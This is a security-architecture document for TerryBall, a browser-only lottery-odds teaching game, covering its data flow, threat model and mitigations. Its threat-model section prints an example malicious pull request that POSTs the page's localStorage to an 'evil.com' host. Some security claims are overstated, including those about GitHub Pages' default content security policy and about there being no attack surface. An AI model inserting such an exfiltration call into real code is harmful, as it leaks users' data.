# Security Architecture: Understanding TerryBall's Data Flow

## Overview

TerryBall is designed with **security by architecture** - not because we added security features, but because the fundamental design eliminates most attack vectors. This document explains how data flows through the system and why it's inherently secure.

## The Core Principle: Client-Side Execution

**Key Insight:** TerryBall has **no backend server**. All computation happens in your browser.

```
Traditional Web App:          TerryBall:
┌─────────┐                  ┌─────────┐
│ Browser │ ←── data ──→     │ Browser │ ←── files (once) ──┐
└─────────┘                  └─────────┘                     │
     ↓                            ↓                           │
  Sends data                  ALL computation              ┌──┴──┐
     ↓                        happens HERE                 │ CDN │
┌─────────┐                  (JavaScript)                  └─────┘
│ Server  │                       ↓                           ↑
│ Backend │                   No data sent                    │
│Database │                   back to server              ┌───┴────┐
└─────────┘                                               │ GitHub │
     ↓                                                     └────────┘
Stores data
(attack target!)
```

## Data Flow Diagram

### Phase 1: Initial Page Load

```
[User] → Requests https://tjpools.github.io/TerryBall
           ↓
[DNS] → Resolves to GitHub's CDN
           ↓
[GitHub CDN] → Serves static files:
           ├── index.html (structure)
           ├── style.css (presentation)
           └── game.js (logic)
           ↓
[User's Browser] → Receives files, stops communication
```

**What's transmitted:**
- HTML/CSS/JS files (public, read-only)
- HTTPS encrypted (TLS 1.3)
- One-way: Server → Browser
- **NO user data sent to server**

### Phase 2: Playing the Game

```
[Browser Memory]
    ↓
User clicks number → game.js captures click
    ↓
JavaScript updates DOM → Visual feedback
    ↓
User clicks "Play" → game.js generates random winning numbers
    ↓
JavaScript compares → Determines win/loss
    ↓
JavaScript updates display → Shows results
    ↓
[LocalStorage] ← Saves statistics (locally only)
```

**What happens:**
- All computation in browser's JavaScript engine
- Data stored in browser's localStorage (never leaves device)
- Random number generation uses browser's crypto API
- No network requests after initial load

### Phase 3: Simulations

```
User clicks "Simulate 10,000 games"
    ↓
[JavaScript in Browser]
    ↓
Loop 10,000 times:
  - Generate random player numbers
  - Generate random winning numbers
  - Compare and count wins
    ↓
Display results in browser
    ↓
NO DATA SENT TO SERVER
```

**Computation location:**
- Your device's CPU
- Your device's memory
- Zero server involvement

## Security Model

### What We DON'T Store (By Design)

❌ **No user accounts** → Can't be hacked
❌ **No passwords** → Can't be stolen
❌ **No personal data** → Can't be leaked
❌ **No server-side database** → Can't be SQL injected
❌ **No API keys in code** → Can't be exposed
❌ **No backend logic** → Can't be exploited
❌ **No user-generated content** → Can't be XSS'd (mostly)

### What We DO Store

✅ **Browser localStorage** (local to user):
```javascript
{
  "gamesPlayed": 42,
  "wins": 0
}
```
- Stored on YOUR device
- Specific to YOUR browser
- Cleared when you clear browsing data
- Never sent to server

✅ **GitHub Repository** (version control):
- Public source code (intentional)
- Commit history
- Issues and PRs
- All visible by design (open source)

## Attack Surface Analysis

### Traditional Web App Attack Vectors:

| Attack Vector | TerryBall Status | Why |
|--------------|------------------|-----|
| **SQL Injection** | ❌ Not applicable | No database |
| **XSS (Server-side)** | ❌ Not applicable | No server-side rendering |
| **CSRF** | ❌ Not applicable | No state-changing requests |
| **Session Hijacking** | ❌ Not applicable | No sessions |
| **Credential Theft** | ❌ Not applicable | No credentials |
| **API Abuse** | ❌ Not applicable | No API endpoints |
| **DDoS on Backend** | ⚠️ Possible on CDN | GitHub handles this |
| **Code Tampering** | ⚠️ Possible on client | Only affects that user |
| **Supply Chain** | ⚠️ Possible | Monitored by Dependabot |

### Remaining Attack Vectors (and Mitigations)

#### 1. **Client-Side Code Tampering**

**Threat:** User modifies JavaScript in browser DevTools

**Impact:** Only affects that user's experience
```javascript
// User could do this in console:
selectedNumbers = [1,2,3,4,5];
winningNumbers = [1,2,3,4,5]; // Cheat to "win"
```

**Mitigation:** 
- ✅ Not a security issue (they're only cheating themselves)
- ✅ No money/prizes involved
- ✅ No leaderboards to corrupt
- ✅ Educational purpose remains intact

#### 2. **Malicious Pull Requests**

**Threat:** Attacker submits PR with malicious code

**Example malicious code:**
```javascript
// Evil: Steal data
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({data: localStorage})
});
```

**Mitigation:**
- ✅ Manual PR review (you approve all changes)
- ✅ CodeQL scans for suspicious patterns
- ✅ GitHub Actions review workflow
- ✅ Branch protection prevents direct pushes

#### 3. **Supply Chain Attack**

**Threat:** Compromised dependency (if we add any)

**Current status:** Zero external dependencies
- No npm packages
- No external libraries
- Pure HTML/CSS/JavaScript

**Mitigation (if we add dependencies):**
- ✅ Dependabot monitors for vulnerabilities
- ✅ Automated security updates
- ✅ Minimal dependency philosophy

#### 4. **CDN Compromise**

**Threat:** GitHub's CDN serves malicious files

**Impact:** Could affect all users

**Mitigation:**
- ✅ Trust GitHub's infrastructure (reasonable)
- ✅ Signed commits verify code authenticity
- ✅ GitHub's security team handles CDN security
- ⚠️ No subresource integrity (SRI) needed (no external resources)

#### 5. **Social Engineering**

**Threat:** Attacker impersonates project owner

**Mitigation:**
- ✅ GPG-signed commits prove authenticity
- ✅ GitHub verified badge (when you add 2FA)
- ✅ LICENSE file establishes ownership
- ✅ CODEOWNERS file declares maintainers

## Data Privacy Analysis

### What TerryBall Knows About You: Nothing

```
User plays 100 games → All data stays in browser
User simulates 10,000 games → All computation local
User closes browser → localStorage persists (locally)
User clears data → All evidence gone
```

**We literally cannot track you because:**
- No server-side logging
- No analytics (no Google Analytics, etc.)
- No cookies (beyond browser defaults)
- No fingerprinting
- No IP address collection

**Contrast with typical website:**
```
User visits site
  ↓
Server logs: IP, user agent, referrer, timestamp
  ↓
Analytics: Session tracking, behavior analysis
  ↓
Database: Stores preferences, history, patterns
  ↓
Third parties: Ads, tracking pixels, social buttons
```

**TerryBall:**
```
User visits site
  ↓
CDN serves files (logs IP at GitHub, not us)
  ↓
[End of server interaction]
  ↓
Everything else is local
```

## Security Through Simplicity

### The Unix Philosophy Applied to Web Security:

**Unix Principle:** "Do one thing and do it well"

**TerryBall's approach:**
1. **One thing:** Demonstrate combinatorial complexity
2. **Do it well:** Client-side computation, zero backend
3. **Security emerges:** No attack surface = No attacks

### Why This Matters:

**Complex systems have complex failures:**
- WordPress: 50,000+ lines, plugins, database → Constant patches
- TerryBall: ~500 lines, zero dependencies → Minimal attack surface

**Livermore's lesson applies to security:**
- He tried to CONTROL complex markets → Failed
- We ELIMINATED complexity where possible → Succeeded

## Trust Model

### What You're Trusting:

```
[You trust]
    ↓
┌─────────────────────────────────┐
│ GitHub's Infrastructure         │
│  - CDN serves correct files     │
│  - HTTPS encryption works       │
│  - No tampering in transit      │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ Your Browser                    │
│  - JavaScript engine works      │
│  - localStorage is private      │
│  - Random numbers are random    │
└─────────────────────────────────┘
    ↓
┌─────────────────────────────────┐
│ The Code (Open Source)          │
│  - You can read it              │
│  - You can verify it            │
│  - You can audit it             │
└─────────────────────────────────┘
```

### What You're NOT Trusting:

❌ **No third-party backend** (we don't have one)
❌ **No external APIs** (zero dependencies)
❌ **No closed-source components** (all code visible)
❌ **No hidden behavior** (read the source!)

## Deployment Pipeline Security

### From Development to Production:

```
[Local Development]
  ↓
git commit -S (signed with GPG)
  ↓
git push to GitHub
  ↓
┌────────────────────────┐
│ GitHub Actions         │
│  - CodeQL scans code   │
│  - Security checks     │
│  - File integrity      │
└────────────────────────┘
  ↓
Branch protection checks
  ↓
Merge to main (if approved)
  ↓
GitHub Pages deployment
  ↓
CDN distribution
  ↓
[User's Browser]
```

**Security at each step:**
1. **Development:** GPG signing proves author identity
2. **Push:** GitHub verifies credentials
3. **CI/CD:** Automated security scanning
4. **Protection:** Branch rules prevent accidents
5. **Deployment:** GitHub's secure pipeline
6. **Distribution:** HTTPS to user

## Incident Response

### If Someone Reports a Security Issue:

**Process:**
1. Report via GitHub Security Advisory (private)
2. Evaluate severity
3. Fix in private branch
4. Deploy fix
5. Public disclosure after fix

**What "security issue" means for us:**
- Not: "I can cheat in my browser" (intended behavior)
- Yes: "Malicious code in PR" (code review catches)
- Yes: "XSS vulnerability" (CodeQL would catch)
- Not: "Someone forked and modified" (open source allows this)

### Contact:

**For security issues:**
- GitHub: @tjpools
- Email: [Your contact] (optional)
- Private disclosure: GitHub Security Advisories

**NOT security issues:**
- "I don't like the odds" (that's the point!)
- "The game won't let me cheat" (working as designed)
- "Someone made a malicious fork" (they can fork, we don't control forks)

## Educational Value: Security by Design

### Lessons TerryBall Teaches:

**About Probability:**
- Combinatorial complexity (285,012)
- Client-side randomness
- Statistical convergence

**About Security (This Document):**
- ✅ **Least privilege:** Browser only gets static files
- ✅ **Defense in depth:** Multiple scanning layers
- ✅ **Zero trust:** No trusted backend to compromise
- ✅ **Transparency:** Open source = auditable
- ✅ **Simplicity:** Fewer components = fewer vulnerabilities

**About System Design:**
- ✅ **Stateless architecture:** No sessions, no state
- ✅ **Client-side computation:** Scales infinitely
- ✅ **Immutable deployment:** Files don't change
- ✅ **Distributed by design:** CDN handles load

## Comparison: TerryBall vs. Traditional Web App

| Aspect | Traditional | TerryBall | Security Benefit |
|--------|-------------|-----------|------------------|
| **Backend** | Yes (Node/Python/etc) | No | Can't hack what doesn't exist |
| **Database** | Yes (MySQL/Postgres) | No | Can't SQL inject nothing |
| **User Auth** | Yes (passwords) | No | Can't steal credentials |
| **Server State** | Yes (sessions) | No | Can't hijack sessions |
| **API Endpoints** | Many | Zero | Zero attack surface |
| **Network Requests** | Continuous | One-time | Can't intercept ongoing traffic |
| **Data Storage** | Server-side | Client-side | User controls their data |
| **Scalability** | Limited | Infinite | CDN handles all load |

## Conclusion: Security Through Architecture

**The Parallel to TerryBall's Core Lesson:**

**Game teaches:**
> "You can't control 285,012 combinations, but you can understand them."

**Security teaches:**
> "We can't prevent all attacks, but we can eliminate most vectors by design."

**Both demonstrate:**
> **Working WITH constraints rather than fighting them.**

### The Security Model:

**We didn't secure TerryBall by:**
- Adding firewalls
- Implementing authentication
- Encrypting databases
- Rate limiting APIs

**We secured TerryBall by:**
- ✅ Not having a backend
- ✅ Not storing user data
- ✅ Not needing credentials
- ✅ Making everything client-side

**This is "security by absence"** - the most secure backend is the one that doesn't exist.

### For Students and Developers:

**Learn from this approach:**
1. **Question assumptions:** Do you NEED a backend?
2. **Minimize complexity:** Fewer components = fewer bugs
3. **Embrace constraints:** Client-side-only = inherently secure
4. **Be transparent:** Open source enables trust
5. **Automate verification:** Let machines catch mistakes

---

## Appendix: Technical Details

### Browser Security Features We Leverage:

**Same-Origin Policy:**
- JavaScript can only access its own domain
- localStorage is isolated per origin
- No cross-site data leakage

**Content Security Policy (CSP):**
```
GitHub Pages default CSP prevents:
- Inline scripts (XSS protection)
- External resource loading
- iframe embedding attacks
```

**HTTPS Everywhere:**
- TLS 1.3 encryption
- Certificate pinning (handled by browser)
- No mixed content

**Subresource Integrity (SRI):**
- Not needed (we have no external dependencies)
- If we add libraries, we'll use SRI

### Cryptographic Random Numbers:

**Browser's Crypto API:**
```javascript
// We use:
Math.random() // Sufficient for game (not cryptographic)

// For security-critical, would use:
crypto.getRandomValues() // Cryptographically secure
```

**For TerryBall:** `Math.random()` is fine (no money at stake)
**For production:** Use `crypto.getRandomValues()`

### localStorage Security:

**What it is:**
- Key-value storage
- ~10MB limit
- Origin-specific
- Persists across sessions

**Security properties:**
- ✅ Same-origin policy enforced
- ✅ Cannot be accessed by other sites
- ✅ Not sent in HTTP requests
- ⚠️ Visible in DevTools (user can see/edit their own)
- ⚠️ Cleared by browser data clearing

**What we store:**
```javascript
{
  "powerballStats": {
    "gamesPlayed": 42,
    "wins": 0
  }
}
```

**Why this is safe:**
- No sensitive data (just game stats)
- User owns their device
- No server replication
- User can clear anytime

---

*This security architecture demonstrates that the most secure system is often the simplest one. By eliminating server-side complexity, we eliminated most attack vectors. The lesson: sometimes the best defense is not needing to defend.*

**Related Documents:**
- [PHILOSOPHY.md](PHILOSOPHY.md) - Why simplicity beats complexity
- [CAUTIONARY_TALE.md](CAUTIONARY_TALE.md) - Jesse Livermore and the illusion of control
- [EPILOGUE.md](EPILOGUE.md) - We lived the lesson while teaching it

🔒 **Secure by design. Simple by choice. Educational by nature.** 🎱
